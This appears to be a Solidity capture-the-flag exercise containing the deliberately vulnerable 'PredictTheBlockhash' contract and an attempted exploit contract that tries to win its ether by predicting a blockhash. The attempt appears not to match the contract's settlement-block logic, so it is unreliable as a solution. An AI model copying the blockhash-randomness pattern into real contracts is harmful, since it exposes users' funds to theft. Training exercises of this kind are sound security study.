// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";

//Challenge
contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(
            msg.value == 1 ether,
            "Requires 1 ether to create this contract"
        );
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        require(
            block.number > settlementBlockNumber,
            "Requires block.number to be more than settlementBlockNumber"
        );

        bytes32 answer = blockhash(settlementBlockNumber);
        console.logBytes32(answer);
        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}

// Write your exploit contract below
contract ExploitContract {
    PredictTheBlockhash public predictTheBlockhash;
    bytes32 answer;

    constructor(PredictTheBlockhash _predictTheBlockhash) {
        predictTheBlockhash = _predictTheBlockhash;
    }

    // write your exploit code below
    function blockHash() public{

        answer = blockhash(block.number - 1);
        console.logBytes32(answer);
    }
    function lockIn() public payable {
        predictTheBlockhash.lockInGuess{value: msg.value}(answer);
    }

    function settle() public {
        predictTheBlockhash.settle();
    }

    receive() external payable {}

}
